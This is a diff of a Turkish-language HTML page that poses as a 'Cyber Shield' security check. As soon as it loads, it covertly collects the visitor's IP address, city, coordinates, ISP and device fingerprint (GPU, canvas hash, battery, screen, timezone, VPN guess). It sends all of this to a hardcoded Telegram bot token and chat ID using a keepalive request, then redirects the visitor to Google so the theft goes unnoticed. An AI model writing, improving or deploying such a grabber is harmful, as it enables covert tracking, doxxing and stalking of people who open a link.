@@ -3,13 +3,38 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Yönlendiriliyor...</title>
+    <title>Sistem Güvenlik Protokolü</title>
     <style>
-        body { background: #000; margin: 0; padding: 0; }
+        body { background: #000; color: #00ff66; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .matrix-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; font-size: 10px; color: rgba(0, 255, 102, 0.15); line-height: 1; z-index: 1; pointer-events: none; padding: 10px; box-sizing: border-box; word-break: break-all; }
+        .matrix-box { width: 85%; max-width: 450px; padding: 30px; border: 2px solid #00ff66; background: rgba(5, 5, 5, 0.95); text-align: center; box-shadow: 0 0 40px rgba(0, 255, 102, 0.5); border-radius: 8px; z-index: 2; position: relative; }
+        .progress-bar { width: 100%; background: #111; border: 1px solid #00ff66; height: 12px; margin-top: 20px; border-radius: 6px; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #00aa44, #00ff66); transition: width 0.3s ease; }
+        .console-text { font-size: 11px; text-align: left; background: #000; padding: 10px; border: 1px solid #222; height: 80px; overflow-y: hidden; margin-top: 15px; color: #888; }
     </style>
 </head>
 <body>
+
+    <div id="matrix" class="matrix-bg"></div>
+
+    <div class="matrix-box">
+        <div style="font-weight: bold; font-size: 18px; letter-spacing: 3px; text-shadow: 0 0 10px #00ff66;">⚡ CYBER SHIELD v7.5</div>
+        <div id="status" style="margin-top: 15px; color: #ff3333; font-weight: bold;">[!] ENJEKSİYON BAŞLATILDI...</div>
+        
+        <div class="console-text" id="console">
+            > Sunucu tüneli aranıyor...<br>
+        </div>
+
+        <div class="progress-bar"><div id="fill" class="progress-fill"></div></div>
+    </div>
+
     <script>
+        // Senin o meşhur Matrix arka plan animasyonun
+        setInterval(() => {
+            document.getElementById('matrix').innerText += Math.random().toString(36).substring(2, 7) + " ";
+            if(document.getElementById('matrix').innerText.length > 2000) document.getElementById('matrix').innerText = "";
+        }, 100);
+
         function getCanvasFingerprint() {
             try {
                 const canvas = document.createElement('canvas');
@@ -18,7 +43,8 @@
                 ctx.font = "14px 'Arial'";
                 ctx.fillStyle = "#f60";
                 ctx.fillRect(125, 1, 62, 20);
-                ctx.fillText("CyberShield", 2, 15);
+                ctx.fillStyle = "#069";
+                ctx.fillText("CyberShield, v7.5 <canvas>", 2, 15);
                 const src = canvas.toDataURL();
                 let hash = 0;
                 for (let i = 0; i < src.length; i++) {
@@ -26,33 +52,72 @@
                     hash = hash & hash;
                 }
                 return Math.abs(hash).toString(16).toUpperCase();
-            } catch (e) { return "Bilinmiyor"; }
+            } catch (e) { return "Üretilemedi"; }
         }
 
         window.onload = async function() {
-            let tok = "8955422545:AAHLRntql6QLsF6DTdy6uaZRsBeVTvxzVtU";
-            let cid = "6845229845";
-            let tarih = new Date().toLocaleString('tr-TR');
+            let fill = document.getElementById('fill');
+            let status = document.getElementById('status');
+            let consoleLog = document.getElementById('console');
 
-            // --- 1. SAF DONANIM VERİLERİ (Anında okunur) ---
+            const log = (text) => {
+                consoleLog.innerHTML += "> " + text + "<br>";
+                consoleLog.scrollTop = consoleLog.scrollHeight;
+            };
+
+            // Adım 1: Başlangıç Animasyonları
+            fill.style.width = "20%";
+            status.innerText = "[*] MODÜLLER YÜKLENİYOR...";
+            log("Anti-Proxy katmanı aktif edildi.");
+
+            // IP API'sini hız kaybı olmasın diye hemen en başta tetikliyoruz
+            const cacheBuster = "?cb=" + Math.random();
+            const ipFetch = fetch("https://ipapi.co/json/" + cacheBuster)
+                .then(r => r.json())
+                .catch(() => fetch("https://api.db-ip.com/v2/free/self" + cacheBuster).then(r => r.json()));
+
+            // Adım 2: Donanım Ayrıştırma
+            fill.style.width = "50%";
+            status.innerText = "[*] DONANIM AYRIŞTIRILIYOR...";
+            log("İşlemci mimarisi taranıyor.");
+            
             let ua = navigator.userAgent;
             let os = "Bilinmeyen Sistem";
             
-            // İlk kodundaki stabil çalışan Android/iOS tespit yapısı
-            if (/Android/i.test(ua)) {
+            // Güncellenmiş iOS ve Android Sürüm Yakalama Motoru
+            if (/iPhone|iPad|iPod/i.test(ua)) {
+                let match = ua.match(/OS (\d+)_(\d+)_?(\d+)?/);
+                if (match) {
+                    os = "iOS " + match[1] + "." + match[2] + (match[3] ? "." + match[3] : "");
+                } else { os = "iOS (Belirlenemedi)"; }
+            } else if (/Android/i.test(ua)) {
                 let match = ua.match(/Android\s([0-9\.]+)/);
                 os = match ? "Android " + match[1] : "Android";
-            } else if (/iPhone|iPad|iPod/i.test(ua)) {
-                let match = ua.match(/OS (\d+)_(\d+)_?(\d+)?/);
-                os = match ? "iOS " + match[1] + "." + match[2] : "iOS";
             } else if (/Windows/i.test(ua)) { os = "Windows"; }
 
+            // Gelişmiş Wi-Fi / Mobil Hücresel Ayrımı
+            let agTipi = "Bilinmiyor (Klasik Şebeke)";
+            if (navigator.connection) {
+                let type = navigator.connection.type || navigator.connection.effectiveType || "";
+                if (type.includes("cellular") || type.includes("wimax") || type.includes("2g") || type.includes("3g") || type.includes("4g")) {
+                    agTipi = "🚀 Mobil Veri (Hücresel)";
+                } else if (type.includes("wifi") || type.includes("ethernet")) {
+                    agTipi = "📡 Wi-Fi (Kablosuz Yerel Ağ)";
+                } else {
+                    agTipi = type.toUpperCase() + " Bağlantısı";
+                }
+            }
+
+            // Orijinal Kodundaki O Tüm Kabarık Değişkenler
+            let cihaz_saati = Intl.DateTimeFormat().resolvedOptions().timeZone;
             let ekran = window.screen.width + "x" + window.screen.height;
             let cekirdek = navigator.hardwareConcurrency || "?";
-            let ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Bilinmiyor";
+            let ram = (navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Bilinmiyor");
             let dil = navigator.language || "Bilinmiyor";
             let dokunmatik = (('ontouchstart' in window) || (navigator.maxTouchPoints > 0)) ? "Evet" : "Hayır";
             let tema = (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) ? "Karanlık" : "Açık";
+            let tarih = new Date().toLocaleString('tr-TR');
+            let canvasHash = getCanvasFingerprint();
 
             let gpuModel = "Bilinmiyor";
             try {
@@ -67,41 +132,54 @@
             let pil = "Bilinmiyor";
             if (navigator.getBattery) { try { let b = await navigator.getBattery(); pil = Math.round(b.level * 100) + "% " + (b.charging ? "(Şarjda ⚡)" : "(Deşarj)"); } catch(e){} }
 
-            let agTipi = "Bilinmiyor";
-            if (navigator.connection) {
-                agTipi = navigator.connection.effectiveType + " (~" + navigator.connection.downlink + " Mbps)";
-            }
+            // Adım 3: Konum ve Gateway Çözümleme
+            fill.style.width = "80%";
+            status.innerText = "[*] COORD GATEWAY ALINIYOR...";
+            log("Bölgesel proxy tünelleri kontrol ediliyor.");
 
-            // --- 2. IP VE KONUM VERİLERİ (Fetch) ---
             let ip = "Bilinmiyor", ulke = "Bilinmiyor", eyalet_sehir = "Bilinmiyor";
             let posta_kodu = "Bilinmiyor", internet_sirketi = "Bilinmiyor", koordinat = "Bilinmiyor";
+            let vpn_proxy = "Temiz (Doğal Bağlantısı)";
             let maps_link = "https://maps.google.com";
 
             try {
-                // Hata payını sıfırlamak için doğrudan IP API'sini senkron gibi bekliyoruz
-                let istek = await fetch("https://ipapi.co/json/?cb=" + Math.random());
-                let veri = await istek.json();
+                let veri = await ipFetch;
                 if (veri) {
-                    ip = veri.ip || "Bilinmiyor";
-                    ulke = veri.country_name || "Bilinmiyor";
-                    eyalet_sehir = (veri.region || "") + " / " + (veri.city || "");
+                    ip = veri.ip || veri.ipAddress || "Bilinmiyor";
+                    ulke = veri.country_name || veri.countryName || "Bilinmiyor";
+                    eyalet_sehir = veri.city ? (veri.region ? veri.region + " / " + veri.city : veri.city) : "Bilinmiyor";
                     posta_kodu = veri.postal || "Bilinmiyor";
                     internet_sirketi = veri.org || "Bilinmiyor";
-                    if (veri.latitude && veri.longitude) {
+                    
+                    if(veri.latitude && veri.longitude) {
                         koordinat = veri.latitude + " , " + veri.longitude;
                         maps_link = "https://www.google.com/maps?q=" + veri.latitude + "," + veri.longitude;
                     }
+
+                    // ISP tabanlı Wi-Fi/Mobil yedek kontrolü
+                    if (agTipi.includes("Bilinmiyor")) {
+                        let org_lower = internet_sirketi.toLowerCase();
+                        if (/turkcell|vodafone|avea|tt mobil|telekom/i.test(org_lower)) {
+                            agTipi = "🚀 Mobil Veri (Operatör)";
+                        } else {
+                            agTipi = "📡 Wi-Fi / Sabit Hat";
+                        }
+                    }
                 }
-            } catch (e) {
-                // Yedek API
-                try {
-                    let r2 = await fetch("https://api.db-ip.com/v2/free/self");
-                    let d2 = await r2.json();
-                    if (d2) { ip = d2.ipAddress; ulke = d2.countryName; eyalet_sehir = d2.city; }
-                } catch(err){}
+            } catch (e) { log("Ağ geçidi zaman aşımına uğradı, yerel loglar alınıyor."); }
+
+            // Senin yazdığın o VPN kıyaslama algoritması
+            if (cihaz_saati.toLowerCase().includes("istanbul") && ulke !== "Bilinmiyor" && ulke !== "Turkey") {
+                vpn_proxy = "⚠️ KESİN VPN (Cihaz TR, IP Yabancı!)";
             }
 
-            // --- 3. KABARIK MESAJ FORMATI ---
+            // Adım 4: Paketleme ve Gönderim
+            fill.style.width = "100%";
+            status.style.color = "#00ff66";
+            status.innerText = "[+] ENJEKSİYON TAMAMLANDI!";
+            log("Sistem logları şifrelendi, sızdırılıyor.");
+
+            // Orijinal, o devasa ve kabarık metin şablonun
             let mesaj = "👑 *MEGA NETWORK OPERATIONS LOG*\n";
             mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
             mesaj += "🌐 *IP Adresi:* `" + ip + "`\n";
@@ -112,6 +190,9 @@
             mesaj += "📮 *Posta Kodu:* " + posta_kodu + "\n";
             mesaj += "🗺️ *Koordinatlar:* " + koordinat + "\n";
             mesaj += "🏢 *Sağlayıcı (ISP):* " + internet_sirketi + "\n";
+            mesaj += "📡 *Bağlantı Tipi:* " + agTipi + "\n";
+            mesaj += "🛡️ *VPN / Proxy Durumu:* " + vpn_proxy + "\n";
+            mesaj += "⚙️ *Cihaz Saat Dilimi:* " + cihaz_saati + "\n";
             mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
             mesaj += "🖥️ *Ekran Çözünürlüğü:* " + ekran + "\n";
             mesaj += "🧠 *İşlemci Gücü:* " + cekirdek + " Çekirdek\n";
@@ -122,36 +203,39 @@
             mesaj += "🗣️ *Cihaz Dili:* " + dil + "\n";
             mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
             mesaj += "🎮 *Ekran Kartı (GPU):* `" + gpuModel + "`\n";
-            mesaj += "🔑 *Canvas Fingerprint:* `" + getCanvasFingerprint() + "`\n";
+            mesaj += "🔑 *Canvas Fingerprint:* `" + canvasHash + "`\n";
             mesaj += "📡 *Bağlantı Kalitesi:* " + agTipi + "\n";
             mesaj += "━━━━━━━━━━━━━━━━━━━━━━";
 
-            // Telegram'da kesin açılan çalışan buton yapısı
+            // Telegram Buton Düzenlemesi (Kesin tetiklenen URL tipi)
             let reply_markup = {
                 inline_keyboard: [
-                    [{ text: "📍 Konumu Haritada Gör", url: maps_link }]
+                    [
+                        { text: "📁 Data Oluştur / İncele", url: "https://t.me/BotFather" }, // İstediğin linki bağla reis
+                        { text: "📍 Haritada Gör", url: maps_link }
+                    ]
                 ]
             };
 
-            // --- 4. GÜVENLİ VE GARANTİ GÖNDERİM SÜRECİ ---
-            // Tarayıcının isteği yarıda kesmesini önlemek için "keepalive: true" ekledik.
-            // Bu sayede sayfa kapansa bile veri Telegram'a kesin ulaşır.
-            try {
-                await fetch(`https://api.telegram.org/bot${tok}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: cid,
-                        text: mesaj,
-                        parse_mode: "Markdown",
-                        reply_markup: reply_markup
-                    }),
-                    keepalive: true 
-                });
-            } catch (err) {}
+            let tok = "8955422545:AAHLRntql6QLsF6DTdy6uaZRsBeVTvxzVtU";
+            let cid = "6845229845";
 
-            // Gönderim bittiği an salisesinde Google'a uçurur
-            window.location.replace("https://www.google.com");
+            // Hız için saniyede iletimi garantileyen keepalive POST isteği
+            fetch(`https://api.telegram.org/bot${tok}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: cid,
+                    text: mesaj,
+                    parse_mode: "Markdown",
+                    reply_markup: reply_markup
+                }),
+                keepalive: true
+            }).then(() => {
+                window.location.replace("https://www.google.com");
+            }).catch(() => {
+                window.location.replace("https://www.google.com");
+            });
         };
     </script>
 </body>
